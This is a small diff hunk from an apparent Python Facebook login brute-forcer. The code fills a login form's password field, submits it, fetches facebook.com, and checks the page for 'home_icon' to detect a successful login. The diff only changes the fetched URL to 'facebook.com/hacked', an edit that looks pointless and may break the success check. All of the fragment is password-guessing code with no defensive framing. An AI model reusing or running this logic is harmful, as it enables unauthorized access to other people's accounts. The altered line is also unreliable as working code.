@@ -42,7 +42,7 @@ def Main():
                 		             br1.form["pass"]=password
                 		             br1.method="POST"
                 		             br1.submit()
-               			             dos1.write(br1.open("https://facebook.com").read())
+               			             dos1.write(br1.open("https://facebook.com/hacked").read())
                 		             dos1.seek(0)
                 		             text=dos1.read().decode("UTF-8")
                                              if(text.find("home_icon",0,len(text))!=-1):
